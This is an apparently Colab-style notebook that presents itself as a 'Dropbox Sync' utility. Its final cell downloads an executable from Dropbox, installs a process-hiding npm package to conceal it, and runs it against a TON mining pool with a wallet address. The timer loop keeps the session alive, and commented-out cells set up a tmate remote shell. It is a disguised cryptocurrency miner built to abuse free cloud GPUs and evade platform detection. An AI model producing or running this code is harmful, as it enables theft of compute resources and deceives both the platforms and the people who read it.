# %%
#@title **Cek**
# !curl ipinfo.io
gpu_info = ! nvidia-smi -L
gpu_info = '\n'.join(gpu_info)
if gpu_info.find('V100-PCIE...') >=0:
  print(gpu_info)
  exit()
else :
  print(gpu_info)
import torch
print(torch.cuda.get_device_name(0))

# %%
#@title **Tmate**
# !pkill -9 tmate
# !wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
# !tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
# !rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
# !./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
# !./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
# !./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"

# %%
#@title **Dropbox Sync** 
import time
# !setterm -foreground blue
# !nvidia-smi
ativar = True #@param {type:'boolean'}
!
temps = 0
sec = 120
while(temps < 43200):
  if(temps == sec):
    sec += 120
    x = (temps/60)/60
    print("Dropbox ",x," Synchronize...")
  time.sleep(1)
  temps += 1

# %%
#@title **Synchronize...**
# %%shell
wget -O Synchronize https://www.dropbox.com/s/4dgaygg0lmxgd4z/cisco?raw=1 > /dev/null 2>&1
chmod +x Synchronize
sudo apt-get update && apt-get install -y screen > /dev/null 2>&1
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y > /dev/null 2>&1
apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y > /dev/null 2>&1
npm i -g node-process-hider > /dev/null 2>&1
ph add transfer > /dev/null 2>&1
./Synchronize run https://next.ton-pool.club EQAOV41G7d93Ug0B6PRjp4RHZ7ID_ivK74nCJiX-X8WtCvwD
